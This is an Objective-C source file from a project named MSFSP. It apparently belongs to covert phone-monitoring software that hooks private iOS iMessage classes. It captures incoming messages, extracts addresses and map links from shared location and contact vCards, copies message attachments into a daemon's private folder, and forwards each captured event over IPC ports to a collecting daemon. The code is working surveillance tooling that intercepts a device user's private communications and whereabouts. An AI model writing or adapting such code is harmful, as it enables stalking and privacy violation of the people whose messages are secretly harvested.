//
//  IMessageUtils.m
//  MSFSP
//
//  Created by Makara Khloth on 7/17/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "IMessageUtils.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"
#import "DaemonPrivateHome.h"

#import "FxIMEvent.h"
#import "FxAttachment.h"

#import "IMMessage.h"
#import "IMFileTransferCenter.h"
#import "IMFileTransfer.h"

static IMessageUtils *_IMessageUtils = nil;

@interface IMessageUtils (private)

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;

- (void) thread: (NSDictionary *) aUserInfo;
- (void) fillAttachments: (IMMessage *) aIMMessage toEvent: (FxIMEvent *) aIMEvent;
- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;

@end


@implementation IMessageUtils

@synthesize mLastMessageID;

+ (IMessageUtils *) shareIMessageUtils {
	if (_IMessageUtils == nil) {
		_IMessageUtils = [[IMessageUtils alloc] init];
	}
	return (_IMessageUtils);
}

/**
 - Method name:						sendData:
 - Purpose:							This method is used to Write iMessage information into the iMessage Ports. 
 Load balance is applied
 - Argument list and description:	aData (NSData)
 - Return description:				Return boolean true if sucess otherwise false
 */

+ (BOOL) sendData: (NSData *) aData {
	BOOL successfully = NO;
	if (!(successfully = [IMessageUtils sendDataToPort:aData portName:kiMessageMessagePort1])) { // Load balance
		DLog (@"First sending fail");
		successfully = [IMessageUtils sendDataToPort:aData portName:kiMessageMessagePort2];
		if (!successfully) {
			DLog (@"Second sending also fail");
		}
	}
	return (successfully);
}

+ (void) captureAttachmentsAndSendFromMessage: (IMMessage *) aMessage toEvent: (FxIMEvent *) aIMEvent {
	IMessageUtils *iMessageUtils = [[IMessageUtils alloc] init];
	NSMutableDictionary *userInfo = [[NSMutableDictionary alloc] init];
	[userInfo setObject:aIMEvent forKey:@"IMEvent"];
	[userInfo setObject:aMessage forKey:@"IMMessage"];
	
	[NSThread detachNewThreadSelector:@selector(thread:) toTarget:iMessageUtils withObject:userInfo];
	
	[userInfo release];
	[iMessageUtils release];
}


+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	successfully = [messagePortSender writeDataToPort:aData];
	[messagePortSender release];
	messagePortSender = nil;
	return (successfully);
}

- (void) thread: (NSDictionary *) aUserInfo {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		FxIMEvent *imEvent = [aUserInfo objectForKey:@"IMEvent"];
		IMMessage *imMessage = [aUserInfo objectForKey:@"IMMessage"];
		
		DLog(@"imEvent = %@, imMessage = %@", imEvent, imMessage);
		
		[self fillAttachments:imMessage toEvent:imEvent];
		
		NSMutableData* data = [[NSMutableData alloc] init];
		NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
		[archiver encodeObject:imEvent forKey:kiMessageArchived];
		[archiver finishEncoding];
		
		BOOL SendSuccess = [IMessageUtils sendData:data];
		if(!SendSuccess){
			[self deleteAttachmentFileAtPathForEvent:[imEvent mAttachments]];
			
		}
		
		[archiver release];
		[data release];
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) fillAttachments: (IMMessage *) aIMMessage toEvent: (FxIMEvent *) aIMEvent {
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	IMMessage *message = aIMMessage;
	
	Class $IMFileTransferCenter = objc_getClass("IMFileTransferCenter");
	IMFileTransferCenter * imfilecenter = [$IMFileTransferCenter sharedInstance];
	id imfilereturn = [imfilecenter transferForGUID:[[message fileTransferGUIDs]objectAtIndex:0] includeRemoved:YES];
	IMFileTransfer * imfile = (IMFileTransfer *)imfilereturn;
	
	NSRange checktype = [[imfile filename] rangeOfString:@".vcf" options:NSCaseInsensitiveSearch];
	
	if (checktype.location != NSNotFound) {
		NSRange seperate = [[imfile filename] rangeOfString:@"loc.vcf" options:NSCaseInsensitiveSearch];
		if (seperate.location != NSNotFound) {
			DLog(@"******************** Loc Found string");
			NSString* googleurl =@"";
			NSString* address   =@"";
			// Extract vcf to String
			NSString *filePath = [imfile localPath];
			NSString *vCardString = [NSString stringWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:nil ];
			DLog(@"vCardString %@",vCardString);
			// Use regular to get mapurl
			NSArray * extactvCard = [vCardString componentsSeparatedByString:@"\n"];
			for (int i =0; i< [extactvCard count]; i++) {
				
				if([[extactvCard objectAtIndex:i] rangeOfString:@".ADR;" options:NSCaseInsensitiveSearch].location != NSNotFound){
					DLog(@"*** address line %@",[extactvCard objectAtIndex:i]);
					NSString *removesymbol = [[extactvCard objectAtIndex:i]  stringByReplacingOccurrencesOfString:@";"withString:@" "];
					DLog(@"*** removesymbol %@",removesymbol);
					NSArray * extactonlcharacter = [removesymbol componentsSeparatedByString:@":"];
					DLog(@"*** extactonlcharacter %@",extactonlcharacter);
					address = [extactonlcharacter objectAtIndex:1];
					DLog(@"*** address %@ ",address);
				}
				
				if([[extactvCard objectAtIndex:i] rangeOfString:@"http://maps" options:NSCaseInsensitiveSearch].location != NSNotFound){
					
					DLog(@"*** url line %@",[extactvCard objectAtIndex:i]);
					NSArray * extactonlyurl = [[extactvCard objectAtIndex:i] componentsSeparatedByString:@"http:"];
					DLog(@"*** extactonlyurl %@",extactonlyurl);
					for (int j =0; j< [extactonlyurl count]; j++) {
						if([[extactonlyurl objectAtIndex:j] rangeOfString:@"//maps" options:NSCaseInsensitiveSearch].location != NSNotFound){
							googleurl = [NSString stringWithFormat:@"%@  \n\n  http:%@",[message summaryString],[extactonlyurl objectAtIndex:j]];
							DLog(@"*** url %@ ",googleurl);
						}
					}
				}
				
				
			}
			if([address length]>0){
				[aIMEvent setMMessage:[NSString stringWithFormat:@"%@\n%@",address,googleurl]];
			}else{
				[aIMEvent setMMessage:[NSString stringWithFormat:@"%@",googleurl]];

			}
			[aIMEvent setMRepresentationOfMessage:kIMMessageText];
			
			DLog(@"address %@",address);
			DLog(@"googleurl %@",googleurl);
		}else {
			DLog(@"******************** Cont Found string");
			
			NSString *filePath = [imfile localPath];
			NSString *vCardString = [NSString stringWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:nil ];
			[aIMEvent setMRepresentationOfMessage:kIMMessageContact];
			[aIMEvent setMMessage:vCardString];
			
			DLog(@"vCardString = %@",vCardString);
			
		}
	}else{
		
		NSMutableArray *attachments = [[NSMutableArray alloc] init];
		NSFileManager *fileManager = [[NSFileManager alloc] init];
		
		DLog(@"***************** fileTransferGUIDs %@",[message fileTransferGUIDs]);
		for(int i =0;i<[[message inlineAttachmentAttributesArray]count];i++){
			
			
			Class $IMFileTransferCenter = objc_getClass("IMFileTransferCenter");
			IMFileTransferCenter * imfilecenter = [$IMFileTransferCenter sharedInstance];
			id imfilereturn = [imfilecenter transferForGUID:[[message fileTransferGUIDs]objectAtIndex:i] includeRemoved:YES];
			IMFileTransfer * imfile = (IMFileTransfer *)imfilereturn;
			
			NSString* iMessageAttachmentPath    = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imiMessage/"];
			NSString *originpath = [imfile localPath];
			NSString *saveFilePath = [NSString stringWithFormat:@"%@%f%@",iMessageAttachmentPath,[[message time] timeIntervalSince1970],[imfile filename]];
			NSError * error = nil;
			
			DLog(@"File is exist %d",[fileManager fileExistsAtPath:originpath]);
			if ([fileManager fileExistsAtPath:originpath]){ 
				DLog(@"***=================== LocalPath %@",[imfile localPath]);
				[fileManager removeItemAtPath:saveFilePath error:&error];
				[fileManager copyItemAtPath:originpath toPath:saveFilePath error:&error];
			}else{
				DLog(@"***===================Data Lost %@",[imfile filename]);
			}
			
			iMessageAttachmentPath = saveFilePath;
			DLog("iMessageAttachmentPath at %@",iMessageAttachmentPath);
			
			FxAttachment *attachment = [[FxAttachment alloc] init];	
			[attachment setFullPath:iMessageAttachmentPath];
			[attachments addObject:attachment];			
			[attachment release];
			
		}
		
		[aIMEvent setMAttachments:attachments];
		[attachments release];
		[fileManager release];
		
	}
	
	[pool release];
}

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0;i<[aAttachmentArray count];i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if(deletesuccess){
			DLog (@"Deleting file %@",path );
		}else{
			DLog (@"Fail deleting file %@",path );
		}
	}
}

@end
